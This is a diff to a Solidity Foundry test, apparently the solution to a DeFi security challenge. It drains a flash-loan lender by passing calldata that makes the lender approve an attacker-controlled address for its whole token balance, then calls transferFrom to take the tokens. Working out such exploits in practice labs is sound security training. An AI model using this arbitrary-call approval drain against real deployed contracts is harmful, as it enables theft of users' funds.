@@ -11,13 +11,20 @@ import {BadCallerBaseTest} from "./BadCallerBase.t.sol";
 
 contract BadCallerTest is BadCallerBaseTest {
     function testExploit() external validation {
-        // vm.startPrank(victim);
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, lender.assets());
-        lender.flashLoan(msg.sender, 0, data);
-        data = abi.encodeWithSignature("transfer(address,uint256)", msg.sender, lender.assets());
-        lender.flashLoan(msg.sender, 0, data);
-        // console2.log("assets: %d", lender.assets());
+        vm.startPrank(victim);
+        // console2.log("token: ", token.balanceOf(address(lender)));
+        // console2.log("lender assets: ", lender.assets());
+        // console2.log("msg.sender: ", msg.sender);
+        // console2.log("victim: ", victim);
+        // console2.log("token: ", address(token));
+        // console2.log("lender: ", address(lender));
+
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(victim), token.balanceOf(address(lender)));
+        lender.flashLoan(address(token), 0, data);
+        token.transferFrom(address(lender), msg.sender, token.balanceOf(address(lender)));
         // lender.loanToken.transfer(msg.sender, lender.assets());
-        // vm.stopPrank();
+        // console2.log("token: %d", token.balanceOf(address(lender)));
+        // console2.log("lender: %d", lender.assets());
+        vm.stopPrank();
     }
 }
